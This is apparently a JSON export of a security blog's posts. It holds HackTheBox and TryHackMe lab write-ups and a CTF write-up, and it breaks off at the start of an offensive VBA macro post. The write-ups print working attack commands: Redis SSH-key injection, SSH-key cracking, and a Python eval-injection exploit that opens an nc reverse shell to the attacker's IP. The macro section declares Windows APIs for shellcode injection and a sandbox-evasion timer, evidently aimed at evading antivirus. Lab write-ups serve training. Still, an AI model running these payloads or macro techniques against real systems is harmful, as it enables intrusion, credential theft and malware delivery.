server. I think we just found our way in, but we can check the HTTP ports later if necessary.Initial FootholdOkay, so, there is a well-known method you can use to exploit open Redis servers for RCE. You can read the method here. The main issue with this vulnerability, is that you are able to write files to the server.Let’s get stuck into this method. You will need redis-cli before you get started.SSH Key GenerationFirst step is to generate a new SSH key, as we can write it to the server using Redis.$ ssh-keygen -t rsa -C \"foo@bar\"Generating public/private rsa key pair.Enter file in which to save the key (/home/username/.ssh/id_rsa): ./ssh_redisEnter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in ./ssh_redis.Your public key has been saved in ./ssh_redis.pub.The key fingerprint is:SHA256:VgShVBnxU9zvX6Few1RGSxknXXiMmOUJsl9ZZApTUCQ foo@barThe key's randomart image is:+---[RSA 3072]----+|      ..**o.EX*X@||     . ..o ++*=OO||      .   =   *=.||         . o . o.||        S   . +..||       .     . +o||            . . +||             .  .||                 |+----[SHA256]-----+Next, we’ll have to surround our key with newlines. We need to do this as the key will be stored in the Redis server’s memory - which in theory can compress strings, this should hopefully maintain the integrity of our SSH key.$ (echo -e \"\\n\\n\"; cat ssh_redis.pub; echo -e \"\\n\\n\") &gt; ssh_redis.txtStoring the SSH Key in RedisNow we can get started with the actual exploit. We’ll start by flushing all commands on the Redis server and storing the contents of our ssh_redis.txt inside a key-value pair.$ redis-cli -h 10.10.10.160 flushallOK$ cat ssh_redis.txt | redis-cli -h 10.10.10.160 -x set exploitOKAwesome, let’s check if our key is correctly stored on the Redis server.$ redis-cli -h 10.10.10.16010.10.10.160:6379&gt; get exploit\"\\n\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDYs2g4+kkvfppjRQu7sBYovd2JosfOz+glXU/5q9ZpVvQEFOPMySLck/q9Gcr2ItQ2hAjs6i1lSCkdkMGVv9MPv6d/28uW16d8sl8cAvVBqWskewSrMpDK9fhoO+0TwZp+r1N0c5/RaNDpAqURvuQOeSmpbBCR3+996fPLWuBO2CO2kwwBgsthxU8dT0m6IebImyRHuzdZFKg2YfHRPrt1vS71p3CAzdxPUqpXwp9PPbxwpQ7Qwqb9BtNR9tLYXy2dKBQWeJV+vL7chb2/fAEOUGIorOei31rdWeZoVKZ8ZHHIzEebdpjSnkeQ/KkiZ7iQgtwskrg23KbVfTqjSO08rLGxnOYnqKAtT+wW6dlTAFiX2EA0EFVJJPHzchGmfRQDvsJNyBw8TsUBfpxjDyxXy4fTNWDpOQTqpCVt/jrGMVNKJPLagRpqb3748Kk6Yx06aqAhhoCXTMf+5X/nuKq454W6g2pYXl4sk0901ePEHT4oWw9PuHLKmrGWMf1OezE= foo@bar\\n\\n\\n\\n\"Perfect.Writing the SSH Key to the ServerNext, we’ll need to write our SSH key to one of the users’ .ssh/authorized_keys file. But this is an issue, we don’t know any of the users! Or do we? This is the first point where it’s possible to trip up. We do, in fact, know one of the users. This user being redis. A quick google search shows that the default home directory for the redis user is at /var/lib/redis. Nice, let’s exploit this.$ redis-cli -h 10.10.10.16010.10.10.160:6379&gt; config set dir /var/lib/redis/.sshOK10.10.10.160:6379&gt; config get dir1) \"dir\"2) \"/var/lib/redis/.ssh\"10.10.10.160:6379&gt; config set dbfilename \"authorized_keys\"OK10.10.10.160:6379&gt; saveOKAccessing the ServerAwesome! We now have an SSH key stored on the redis user. We can now SSH in.$ ssh -i ssh_redis redis@10.10.10.160redis@Postman:~$ ls6379  dkixshbr.so  dump.rdb  ibortfgq.so  module.o  qcbxxlig.so  vlpaulhk.soGetting UserThere doesn’t appear to be anything interesting in redis’ home directory, so we’ll start with basic enumeration.scp -i ssh_redis LinEnum.sh redis@10.10.10.160:/tmp/LinEnum.shredis@Postman:~$ sh /tmp/LinEnum.sh...-e [-] Location and Permissions (if accessible) of .bak file(s):-rwxr-xr-x 1 Matt Matt 1743 Aug 26 00:11 /opt/id_rsa.bak...Wow, is that a backup of the user’s id_rsa. I think it is. Let’s download this and try to use it.$ scp -i ssh_redis redis@10.10.10.160:/opt/id_rsa.bak ./ssh_Mattid_rsa.bak                                                    100% 1743    31.0KB/s   00:00$ ssh -i ssh_Matt Matt@10.10.10.160Enter passphrase for key 'ssh_Matt':Yeah, that was too easy. Of course it’d be password protected. Let’s crack this SSH key.$ /usr/share/john/ssh2john.py ssh_Matt &gt; ssh_Matt.hash$ john ssh_Matt.hash --wordlist=/usr/share/wordlists/rockyou.txtUsing default input encoding: UTF-8Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashesCost 2 (iteration count) is 2 for all loaded hashesWill run 12 OpenMP threadsNote: This format may emit false positives, so it will keep trying even afterfinding a possible candidate.Press 'q' or Ctrl-C to abort, almost any other key for statuscomputer2008     (ssh_Matt)1g 0:00:00:04 DONE (2019-12-30 16:50) 0.2493g/s 3576Kp/s 3576Kc/s 3576KC/s  0125457423 ..\\*7¡Vamos!Session completedNice, so the password for the SSH key is computer2008. Let’s try to SSH in now.ssh -i ssh_Matt Matt@10.10.10.160Enter passphrase for key 'ssh_Matt': Connection closed by 10.10.10.160 port 22Weird. It doesn’t seem to be working. Let’s try SSH’ing into the redis user and logging into Matt’s account that way. Hopefully he re-used his password?redis@Postman:~$ su - MattPassword: Matt@Postman:~$Nice. We have user.Matt@Postman:~$ cat user.txt517ad0ec2458ca97af8d93aac08a2f3cGetting RootSince further enumeration inside the server doesn’t seem to reveal anything, I think we should take a look at that Webmin server we found earlier.$ searchsploit webmin------------------------------------------------------------------------- ---------------------------------------- Exploit Title                                                           |  Path                                                                         | (/usr/share/exploitdb/)------------------------------------------------------------------------- ----------------------------------------Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)   | exploits/linux/remote/46984.rb------------------------------------------------------------------------- ----------------------------------------Shellcodes: No ResultVery interesting. There seems to be an authenticated RCE vulnerability with the exact same version of Webmin that the server is running - and the server is running Webmin as root (we can see this looking at the webmin folder permissions), let’s see what we can do with this.Upon visiting the Webmin service, we can see a login page. Matt seems to like re-using credentials, so let’s try his… they worked? We’re in. So now we have the authentication for our authenticated RCE vulnerability that we discovered earlier. Let’s boot up msfconsole and get a shell.And… we are in!root@Postman:~# lslsredis-5.0.0  root.txtroot@Postman:~# cat root.txta257741c5bed8be7778c6ed95686ddceLessons Learned  People like to re-use credentials, so try them in multiple places.  Redis is always vulnerable.  If there’s no way to gain privilege escalation inside the server, look to the outside.  Search the name of the target technology on Google, searchsploit, CVE details, etc.",
        "url": "/htb/postman/"
      }
      ,
    
      "htb-craft": {
        "title": "HackTheBox - Craft",
        "author": "",
        "category": "",
        "content": "HackTheBox – CraftInitial EnumerationLet’s start our initial enumeration by performing a tcp port scan.$ nmap -sCSV -p 1-10000 10.10.10.110Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-31 02:47 AEDTNmap scan report for 10.10.10.110Host is up (0.066s latency).Not shown: 9997 closed portsPORT     STATE SERVICE  VERSION22/tcp   open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)| ssh-hostkey: |   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)443/tcp  open  ssl/http nginx 1.15.8|_http-server-header: nginx/1.15.8|_http-title: About| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US| Not valid before: 2019-02-06T02:25:47|_Not valid after:  2020-06-20T02:25:47|_ssl-date: TLS randomness does not represent time| tls-alpn: |_  http/1.1| tls-nextprotoneg: |_  http/1.16022/tcp open  ssh      (protocol 2.0)| fingerprint-strings: |   NULL: |_    SSH-2.0-Go| ssh-hostkey: |_  2048 5b:cc:bf:f1:a1:8f:72:b0:c0:fb:df:a3:01:dc:a6:fb (RSA)1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port6022-TCP:V=7.80%I=7%D=12/31%Time=5E0A1C5C%P=x86_64-pc-linux-gnu%r(NSF:ULL,C,\"SSH-2\\.0-Go\\r\\n\");Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelNothing particularly interesting here. An HTTPS server running on port 443, and a weird looking SSH server running on port 6022. Some research on the technologies behind the 6022 SSH server reveal some username enumeration vulnerabilities but nothing of note.Let’s fire up burpsuite and begin spidering the HTTPS server (let’s not forget to add “craft.htb” to our /etc/hosts file). We just want to get a feel for what is on the site.The first thing that jumps out at me are links to two virtual hosts “api.craft.htb”, and “gogs.craft.htb”. Before jumping to those subdomains, we should probably do some vhost discovery. Let’s fire up gobuster and take a look.$ gobuster vhost -u https://craft.htb --wordlist=SecLists/Discovery/Web-Content/common.txt -k===============================================================Gobuster v3.0.1by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)===============================================================[+] Url:          https://craft.htb[+] Threads:      10[+] Wordlist:     SecLists/Discovery/Web-Content/common.txt[+] User Agent:   gobuster/3.0.1[+] Timeout:      10s===============================================================2019/12/31 02:58:21 Starting gobuster===============================================================Found: api.craft.htb (Status: 404) [Size: 233]Found: vault.craft.htb (Status: 404) [Size: 19]===============================================================2019/12/31 02:58:55 Finished===============================================================Nice, so we found another vhost; “vault.craft.htb”. I think our next step should be to visit the “api.craft.htb” vhost, so let’s add this to our scope on burp and begin enumeration (note: don’t forget to add the vhosts to your /etc/hosts file).Just a swagger api spec here, however this vhost does appear to contain all the api functionality for some application, could be a way in, but we’ll take a closer look later. Let’s have a look at the “gogs.craft.htb” vhost next.This page is a lot more interesting. It’s a self-hosted git management service. When we visit the “explore” link, we discover what looks like the repository for the api we discovered earlier. Digging through the issues and commit history we find some credentials for the api in a test script that Dinesh uploaded, but later removed. Oh no, Dinesh.+response = requests.get('https://api.craft.htb/api/auth/login',  auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False)A quick curl request will confirm whether these credentials are still valid.$ curl https://api.craft.htb/api/auth/login -u dinesh:4aUh0A8PbVJxgd -k{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTc3NzMzNTYwfQ.oLb0iw5P-JOaWpB3Jjq14VwIm8AJRmp3lQjcNY014lY\"}They’re still valid. Oh no, Dinesh. Why? I hope you haven’t re-used these credentials for the git management service. Let’s give them a try.Sigh, they worked. I’m not sure what I expected. Let’s dig around some more now that we have access to Dinesh’s account.Initial FootholdSo a bit more digging around with Dinesh’s account didn’t reveal anything too important. However went through all the commits again we find a fix that Dinesh committed. Where he used an eval statement on user input. Oh, Dinesh.Unfortunately we need credentials to use it. But guess who leaked their credentials earlier? Thanks, Dinesh. Now we just need to figure out how we can get RCE. Let’s write a quick python script to leverage this and see if we can get a reverse shell.#!/usr/bin/python3PAYLOAD = 'nc 10.10.14.41 4444 -e /bin/sh'import requestsimport jsonfrom urllib3.exceptions import InsecureRequestWarning# Ignore insecure https request warnings.requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)base_url = 'https://api.craft.htb/api/'creds = ('dinesh', '4aUh0A8PbVJxgd')# Retrieve the authentication token.r = requests.get(base_url+'auth/login', auth=creds, verify=False)# Set our headers.headers = {    'X-Craft-API-Token': r.json()['token'],    'Content-Type': 'application/json'}# Check whether token is valid.r = requests.get(base_url+'auth/check', headers=headers, verify=False)assert r.json()['message'] == 'Token is valid!'# Craft payload.payload = {    'name': 'ghuul',    'brewer': 'ghuul',    'style': 'ghuul'}payload['abv'] = '__import__(\"os\").system(\"%s\") or 10' % PAYLOAD# Make request with payload.payload = json.dumps(payload)requests.post(base_url+'brew/', headers=headers, data=payload, verify=False)Let’s start up netcat on our end… and we have a shell.$ nc -lv -p 4444listening on [any] 4444 ...connect to [10.10.xx.xx] from craft.htb [10.10.10.110] 45519# lsapp.pycraft_apidbtest.pytestsGetting UserSo, a few things to note: we’re logged in as root, but we can’t cat /root/root.txt. In conclusion, we are in a jail. Let’s do some digging around on the server for now, there seem to be a few interesting files.# whoamirootAfter a tiny bit of digging I ran into a file called dbtest.py (we ran into it earlier on the git repo too), and it seems to connect and query the database successfully. So what happens if we upload our own version that allows us to execute arbitrary queries? With a slight modification to our foothold script we can upload a file to the server.PAYLOAD = 'nc 10.10.xx.xx 4444 &gt; database.py'$ nc -lv -p 4444 &lt; database.pylistening on [any] 4444 ...connect to [10.10.xx.xx] from craft.htb [10.10.10.110] 4220Now let’s list the tables for the database, and see if we can read some of the more interesting sounding ones.$ nc -lv -p 4444listening on [any] 4444 ...connect to [10.10.xx.xx] from craft.htb [10.10.10.110] 39969# lsapp.pycraft_apidatabase.pydbtest.pytests# python3 database.py &gt;&gt; SELECT table_name FROM information_schema.tables{'TABLE_NAME': 'brew'}{'TABLE_NAME': 'user'}... &gt;&gt; SELECT * FROM user {'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}{'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}{'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'} &gt;&gt; exit# exitAwesome! More credentials. I wonder if any of these will work for the web server? Let’s try logging into the git management service with these new credentials.Gilfoyle! Of all the people I wouldn’t have expected to re-use credentials, it was you? Even Erlich didn’t re-use his for the git management service! Anyway, a bit of clicking around reveals a new private repository. And in this repository… an ssh key! More credentials, yikes, but at least this repo is private. Let’s try and use this new key, taking a look at the public key, it looks like he used the username “gilfoyle”.$ ssh -i ssh_gilfoyle gilfoyle@10.10.10.110  .   *   ..  . *  **  * @()Ooc()*   o  .    (Q@*0CG*O()  ___   |\\_________/|/ _ \\   |  |  |  |  | / | |   |  |  |  |  | | | |   |  |  |  |  | | | |   |  |  |  |  | | | |   |  |  |  |  | | | |   |  |  |  |  | \\_| |   |  |  |  |  |\\___/   |\\_|__|__|_/|    \\_________/Enter passphrase for key 'keys/ssh_gilfoyle':Ah, a password. No matter. Let’s get cracking.$ /usr/share/john/ssh2john.py ssh_gilfoyle &gt; ssh_gilfoyle.hash$ john ssh_gilfoyle.hash --wordlist=/usr/share/wordlists/rockyou.txtUsing default input encoding: UTF-8Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashesCost 2 (iteration count) is 16 for all loaded hashesWill run 12 OpenMP threadsNote: This format may emit false positives, so it will keep trying even afterfinding a possible candidate.Press 'q' or Ctrl-C to abort, almost any other key for statusWow, nothing? I guess we’ll try the password he re-used for the git service, since the guys at Pied Piper seem to like re-using credentials.$ ssh -i keys/ssh_gilfoyle gilfoyle@10.10.10.110  .   *   ..  . *  **  * @()Ooc()*   o  .    (Q@*0CG*O()  ___   |\\_________/|/ _ \\   |  |  |  |  | / | |   |  |  |  |  | | | |   |  |  |  |  | | | |   |  |  |  |  | | | |   |  |  |  |  | | | |   |  |  |  |  | \\_| |   |  |  |  |  |\\___/   |\\_|__|__|_/|    \\_________/Enter passphrase for key 'keys/ssh_gilfoyle':gilfoyle@craft:~$ And… we’re in. So much credential re-use. Guys, get a password manager, seriously. Let’s get the user flag now.gilfoyle@craft:~$ cat user.txt bbf4b0cadfa3d4e6d0914c9cd5a612d4Getting RootTo start, let’s take a look at Gilfoyle’s home directory. Interesting, a file called .vault-token  We’ve seen mentions of a “vault” around the git repo and we found a vhost with the name “vault”. Let’s take a look at the files we saw on the git repo.vault secrets enable sshvault write ssh/roles/root_otp \\    key_type=otp \\    default_user=root \\    cidr_list=0.0.0.0/0Interesting. Seems like there is some sort of SSH system here. I think it’s time to do some Googling and see what we can find out about this service.So after a bit of research it’s pretty obvious that this is set up as a OTP authentication system for SSH. You can read more about it here. It seems that this one is set up for SSH’ing in as root, nice. Let’s give this a go.gilfoyle@craft:~$ vault ssh -role root_otp -mode otp root@10.10.10.110OTP for the session is: 91220244-1b96-5827-2533-9e05874b36b2Password:root@craft:~#Perfect, it worked. Let’s get the root flag.root@craft:~# cat root.txt 831d64ef54d92c1af795daae28a11591Lessons Learned  People re-use passwords, like, a lot. So when you find credentials, try them everywhere.  Always leverage bad coding practices, like the use of “eval”, and “exec”, etc.  People commonly commit credentials to git repos and later remove them, not realising they’re still in the commit history.",
        "url": "/htb/craft/"
      }
      ,
    
      "htb-bitlab": {
        "title": "HackTheBox - Bitlab",
        "author": "",
        "category": "",
        "content": "HackTheBox – BitlabInitial EnumerationLet’s start with our usual nmap scan.$ nmap -sCSV -p 1-10000 10.10.10.114Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-01 15:11 AEDTNmap scan report for 10.10.10.114Host is up (0.057s latency).Not shown: 9998 filtered portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 (RSA)|   256 e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc (ECDSA)|_  256 c9:54:3d:91:01:78:03:ab:16:14:6b:cc:f0:b7:3a:55 (ED25519)80/tcp open  http    nginx| http-robots.txt: 55 disallowed entries (15 shown)| / /autocomplete/users /search /api /admin /profile | /dashboard /projects/new /groups/new /groups/*/edit /users /help |_/s/ /snippets/new /snippets/*/edit| http-title: Sign in \\xC2\\xB7 GitLab|_Requested resource was http://10.10.10.114/users/sign_in|_http-trane-info: Problem with XML parsing of /evox/aboutService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelNothing too interesting here, apart from the fact that the HTTP server is running Gitlab. Seems like this might be another code-review box, nice. No obvious ways in, so let’s fire up burpsuite and see if its spider picks up anything interesting.So after about 30 seconds of clicking on links we land on an interesting one. The “help” link leads us to an open directory, with an interesting “bookmarks.html” file. Let’s take a look.Initial FootholdHmm, it just seems to be a bunch of links. However, while most of the links go to outside URLs, the “Gitlab Login” link is interesting. It seems to be some poorly obfuscated javascript. So let’s copy this javascript, clean it up a little and see what we can extract from it.function() {    var _0x4b18 = [        \"\\x76\\x61\\x6C\\x75\\x65\",        \"\\x75\\x73\\x65\\x72\\x5F\\x6C\\x6F\\x67\\x69\\x6E\",        \"\\x67\\x65\\x74\\x45\\x6C\\x65\\x6D\\x65\\x6E\\x74\\x42\\x79\\x49\\x64\",        \"\\x63\\x6C\\x61\\x76\\x65\",        \"\\x75\\x73\\x65\\/x72\\x5F\\x70\\x61\\x73\\x73\\x77\\x6F\\x72\\x64\",        \"\\x31\\x31\\x64\\x65\\x73\\x30\\x30\\x38\\x31\\x78\"    ];    document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]] = _0x4b18[3];    document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]] = _0x4b18[5];})()So, the first thing that should jump out at you when looking at this should be the hex. Based on the range of characters it looks like valid ascii. So let’s get decoding. We’ll should also rename the array so it’s a bit more readable, and take the variables out of the array in the document statements at the bottom.function() {    var arr = [        \"value\",        \"user_login\"        \"getElementById\",        \"clave\",        \"user_password\",        \"11des0081x\"    ];    document[\"getElementById\"](\"user_login\")[\"value\"] = \"clave\";    document[\"getElementById\"](\"user_password\")[\"value\"] = \"11des0081x\";}Nice. It’s pretty obvious this is some sort of hacky login script that this dude “clave” wrote. Let’s cut out all the crap so the javascript is readable (an unnecessary step, but indulge me).function() {    document.getElementById(\"user_login\").value = \"clave\";    document.getElementById(\"user_password\").value = \"11des0081x\";}Awesome, now that we have some credentials we should use them. They’re definitely for the gitlab login page. Let’s give them a go and see what we can see.Okay, so it seems like “clave” has access to two repositories, “Profile” and “Deployer”. Let’s give both of these a good read (commits, issues, pull requests, source code, etc) and see if we can’t find anything interesting.So “Profile” is completely uninteresting apart from the fact that it has “Auto DevOps” enabled. “Deployer” is very interesting. It seems to be a git hook for the “Profile” repo. It looks like whenever a successful merge request goes through on “Profile”, the updated “Profile” repo is pulled onto the server. So I think our first step should be finding where the profile page is located on the server. What’s the bet that it’s just at “/profile”?Yup, that worked. Let’s see if can get a shell uploaded. It should be as simple as uploading the shell to another branch on the “Profile” repo and submitting a merge request. Let’s give this a go.Shell successfully uploaded, merge request successful. Hopefully we should be able to see our shell in the profile directory. Yup, there it is.p0wny@shell:…/html/profile# whoamiwww-dataGetting User &amp; RootLet’s upload our enumeration script and see what we can find.p0wny@shell:/tmp# nc 10.10.xx.xx 4444 &gt; LinEnum.sh$ nc -lv -p 4444 &lt; LinEnum.shlistening on [any] 4444 ...connect to [10.10.xx.xx] from bitlab.htb [10.10.10.114] 49978p0wny@shell:/tmp# sh LinEnum.sh...-e [-] Super user account(s):root-e...User www-data may run the following commands on bitlab:    (root) NOPASSWD: /usr/bin/git pull...Huh, so it seems we can use git pull as sudo. We can leverage this, but it’ll be a little weird. I hope you’re familiar with git. I don’t want to go into too much detail as to how this exploit works, but I’ll give you an overview.  You need to create two repositories: one is the remote (the “master”) repository, and one is the “local” repository.  You set the remote of the “local” repo to be the “master” repo you created earlier.  You make changes in both repos, so when you use git pull, a merge is forced.  You can create a file “local/.git/hooks/post-merge”, that gets executed when you git pull.In the example payload.tar, the script that gets executed is a reverse shell. You can look throught the provided files to get a feel for it.We upload our payload to the server using netcat.p0wny@shell:/tmp# nc 10.10.xx.xx 4444 &gt; payload.tar$ nc -lv -p 4444 &lt; payload.tarlistening on [any] 4444 ...connect to [10.10.xx.xx] from bitlab.htb [10.10.10.114] 49978Next we unpack it and execute sudo git pull. Remember we have to have netcat running on our end to receive the reverse shell.p0wny@shell:/tmp# tar xf payload.tarp0wny@shell:/tmp# cd payload/payloadp0wny@shell:…/payload/payload# sudo git pull$ nc -lv -p 4444listening on [any] 4444 ...connect to [10.10.xx.xx] from bitlab.htb [10.10.10.114] 59150# /bin/bash/bin/bashroot@bitlab:/tmp/payload/payload#Awesome. Now we can get the root and user flags.root@bitlab:/# cat /home/clave/user.txtcat /home/clave/user.txt1e3fd81ec3aa2f1462370ee3c20b8154root@bitlab:/# cat /root/root.txtcat /root/root.txt8d4cc131757957cb68d9a0cddccd587cLessons Learned  Git hooks can be leveraged to gain privilege escalation / command execution.  Open directories can leak sensitive information.  Always enumerate for directories (dirbuster would have found both the profile page and the open help directory, we got lucky).",
        "url": "/htb/bitlab/"
      }
      ,
    
      "ctf-cybersocctf": {
        "title": "CyberSOC 2020 CTF",
        "author": "",
        "category": "",
        "content": "CyberSOC CTF ChallengeTheThe CyberSOC challenge is a quite interesting test of patience, perseverance, and the stock ability to think ,The challenge claims a link is hidden in the provided image, a link to which the challenge will be started.My initial thought was “Security by Obscurity” which led me to believe certain information was hidden in the image either in metadata or hidden in bits of unused data of the image file. So therefore i tried extracting metadata using Exiftool, and Checking for hidden data using Steg-analysis tools like Steghide and Stegoveritas …All to no Avail Paying a little attention the image, we notice a Join🛡️.ws , The Shield emoji is similar to Cybersoc logo, so i initially started by substituting the “Shield emoji” for “Cybersoc”Below is the list of domains i tried joincybersoc.ws joincs.ws joincybersocafrica.ws join.cybersoc.wsamongst several others domain iterations,after several minutes i paid attention to the .ws landing page and noticed the Register Your .WS Domain 🙂.ws as in the image belowI immediately did a quick research and found informations related to emoji Domainswhich converts an emoji to punnycode and subtitute the converted character for a domain nameHeading to xn- join-3683c.wsWe are greeted to begin  with the CTF challengeChallenge 1The question asks, What you see ?, which implies we aren’t seeing what we ought to seeGetting curious i dragged the mouse around and figured what the flag wasChallenge 2Zero is more than nothing : and we are provided with binary numbers 01111001 01101111 01110101 01110100 01101000 01101001 01101110 01101011 01111001 01101111 01110101 01110011 01101101 01100001 01110010 01110100A quick Search of Binary decoder give’s several options which inturn leads to an anwserChallenge 3if a flag is more than just cloth and ink, What else could it be ?Asked to crack a code and all we were given are flags, So most definitely we need text characters from the flags.Seeing flags i immediately knew we were dealing with a alpha-2 codes  which are two-letter country codes defined as part of the ISO 3166 standard published by the International Organization for Standardization (ISO), to represent countries, dependent territories, and special areas of geographical interest.An example of alpha 2 code belowSo substituting our flags for the alpah2code equivalent should give us our flag,but one solution leads to another problem How can we identify the nationality of the flags?, All i did was crop out each individual flag and did google reverse image search to figure out the Country the flag belonged toChallenge 4Download and run “run.exe”Well curiosity kills, most people would definitely click a link that says Don’t click me which led me to be quite wary of what an executable with the name “run” does ,Needed to be sure of the app’s content and what it intends to do, so simple reverse engineering with the strings run.exe reveal a hidden flag.Easy right ?Challenge 5Geolocation Provided with a picture and the sole aim of figuring where the photograph was taken, i had little experience from working as an amnesty international decoder   Amnesty Decoders is a global network of digital volunteers, all using  their computers or phone to help Amnesty’s researchers sort through pictures, documents and information and track and expose human rights violationsAfter messing around with reverse image searches with no results , Paying more attention i noticed a quite popular Landmark to the far left The Ikoyi Link Bridge , Two Power line’s , and what seems to be like a dock for boatsSo ignoring the regular directional map and utilizing the rich satellite imagery we come up with a obvious flagChallenge 6Satellite Point Of View was a straight forward test of sight - lolThe challenge was about Picking out glarings structural buildings that had similarities to characters in the English alphabet Each “Datum Point” has a single character of it’s own and the addition of all datum point is the flagChallenge 7when the “geolocation” image was captured?Metadata summarizes basic information about data, and stores that information in unused bits in the file   ExifTool is a free and open-source software program for reading,  writing, and manipulating image, audio, video, and PDF metadataRunning exiftools on the picture revealsClearly we can see When the picture was takenChallenge 8which device was used to capture the image?A quick search of SM-F700F reveals the flagCongratulations on completion of the challenge and remember  The difference between a noob and a hacker is that a hacker has failed more than a noob has ever tried",
        "url": "/ctf/cybersocctf/"
      }
      ,
    
      "thm-gamingserver": {
        "title": "TryHackMe - GamingServer",
        "author": "",
        "category": "",
        "content": "The hack starts with simple port scan Nmap- -sC -sV &lt;machine IP&gt; -oN Default_Scan.txtThe only quick vector for information is port 80 (HTTP) and port 22 (SSH) for attackA quick look at the web page hosted at 80 http://&lt;machine_ip&gt; give us a gaming portal with no much information on the front endbut a usually important view-source:&lt;machine_ip&gt; reveals what to seems to be a username which we store in a text file for later use&lt;img src=”/assets/images/gamingserver/source.png height=”100%” width=”100%”&gt;Web enumeration continued with the “holy Dirbuster” or “ heavenly gobuster” as you please, reveals multiple directories along with  Dic.lst [seems to be a simple wordlist , should to be downloaded]  Secretkey [which seems to be private key, should be downloaded]  Manifesto.txt [very useless manifesto that’s only there to teach you poetry ]&lt;img src=”/assets/images/gamingserver/dirbuster.png height=”100%” width=”100%”&gt;We have a USERNAME and what seems to be an SSH key, nothing stops us from logging into the server using SSH, since the SSH protocol allows the use of SSH keys to authenticate,so long we set the permissions of the private key file to 600 by doing console chmod 600 id_rsaFirst we set the permission and secondly we log in“ssh -i secret_key john@&lt;machine_ip&gt;“ should kick us inBUT OOPS , the “secretkey” need a passwordThe only feasible way forward is to crack the password using a password cracker like “JohnTheRipper” ,but innocent john has no idea of that the KEY is and needs you to convert the file to what it can understandso therefore we firstly need to convert the SSHKEY to what JohntheRipper understands using an inbuilt John plugin called SSH2JOHNthen we use John to crack the the file using the wordlist we recovered from the webserverNow we have a Username, sshkey, and the password to the sshkeyPRIVILEGE ESCALATIONWe use a method called Lxd Privilege EscalationPrivilege escalation through lxd requires the access of local account,Good thing for us since we have SSH access alreadyNote: the most important condition is that the user should be a member of lxd group.If you have completed the introductory researching room on TryHackMeDo your research on LXD PRIVILEGE ESCALATION and root the boxand remember  The difference between a noob and a hacker is that a hacker has failed more than a noob has ever tried",
        "url": "/thm/gamingserver/"
      }
      ,
    
      "xdev-macros": {
        "title": "VB Macros | Variations",
        "author": "",
        "category": "",
        "content": "All exploits are written my myself and are for educational purposes only, i would not be liable for any misuse!###Macros with Several VariationsCredit to Ocktoberfirst on this initial macroType MODULEINFO  lpBaseOfDLL As Long  SizeOfImage As Long  EntryPoint As LongEnd TypePrivate Declare PtrSafe Function Sleep Lib \"KERNEL32\" (ByVal mili As Long) As LongPrivate Declare PtrSafe Function CreateThread Lib \"KERNEL32\" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtrPrivate Declare PtrSafe Function VirtualAlloc Lib \"KERNEL32\" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtrPrivate Declare PtrSafe Function GetPrAddr Lib \"KERNEL32\" Alias \"GetProcAddress\" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtrPrivate Declare PtrSafe Function VirtPro Lib \"KERNEL32\" Alias \"VirtualProtect\" (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProcess As LongPtr, lpflOldProtect As LongPtr) As LongPtrPrivate Declare PtrSafe Function getmod Lib \"KERNEL32\" Alias \"GetModuleHandleA\" (ByVal lpLibFileName As String) As LongPtrPrivate Declare PtrSafe Sub patched Lib \"KERNEL32\" Alias \"RtlFillMemory\" (Destination As Any, ByVal Length As Long, ByVal Fill As Byte)Public Declare PtrSafe Function EnumProcessModulesEx Lib \"psapi.dll\" (ByVal hProcess As LongPtr, lphModule As LongPtr, ByVal cb As LongPtr, lpcbNeeded As LongPtr, ByVal dwFilterFlag As LongPtr) As LongPtrPublic Declare PtrSafe Function GetModuleBaseName Lib \"psapi.dll\" Alias \"GetModuleBaseNameA\" (ByVal hProcess As LongPtr, ByVal hModule As LongPtr, ByVal lpFileName As String, ByVal nSize As LongPtr) As LongPtrFunction MyMacro() 'Get current time, sleep 4 seconds, get time again.  If less than 4 seconds have passed, assume we are in a AV sandbox and exit without running rest of macro. Dim myTime myTime = Time Dim Timein As Date 